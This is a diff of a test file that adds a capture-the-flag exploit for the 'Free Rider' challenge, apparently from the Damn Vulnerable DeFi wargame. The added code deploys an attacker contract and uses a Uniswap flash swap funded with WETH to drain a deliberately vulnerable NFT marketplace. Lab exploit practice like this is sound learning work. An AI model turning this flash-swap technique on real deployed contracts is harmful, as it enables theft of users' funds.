@@ -105,6 +105,25 @@ describe('[Challenge] Free Rider', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        this.aaron = await (await ethers.getContractFactory('AaronScammer', attacker)).deploy(
+            this.marketplace.address,
+            this.nft.address,
+            this.weth.address,
+            this.buyerContract.address,
+            BUYER_PAYOUT
+        );
+
+        const data = ethers.utils.defaultAbiCoder.encode(['uint256'], [1]);
+        console.log('data', data.length);
+
+        const amountFee = ethers.utils.parseEther('0.45');
+        await this.weth.connect(attacker).deposit({value: amountFee});
+        await this.weth.connect(attacker).transfer(this.aaron.address, amountFee);
+        console.log('weth balance aaron', (await this.weth.connect(attacker).balanceOf(this.aaron.address)).toString());
+
+        // token/weth
+        await this.uniswapPair.connect(attacker).swap(NFT_PRICE.mul(AMOUNT_OF_NFTS), 0, this.aaron.address, data);
+
     });
 
     after(async function () {
